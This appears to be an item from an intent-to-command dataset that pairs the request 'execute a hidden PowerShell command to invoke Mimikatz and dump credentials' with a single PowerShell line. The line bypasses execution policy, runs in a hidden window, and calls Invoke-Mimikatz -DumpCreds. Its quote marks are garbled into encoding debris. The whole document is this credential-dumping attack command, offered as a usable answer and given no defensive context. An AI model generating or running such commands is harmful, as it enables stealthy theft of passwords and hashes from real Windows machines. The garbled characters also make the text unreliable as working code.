# Natural language intent:
# Execute a hidden PowerShell command to invoke Mimikatz and dump credentials.

powershell.exe -ep bypass -NoP -NonI -W Hidden -Exec Bypass -Command ï¿½ Invoke-Mimikatz -DumpCredsï¿½
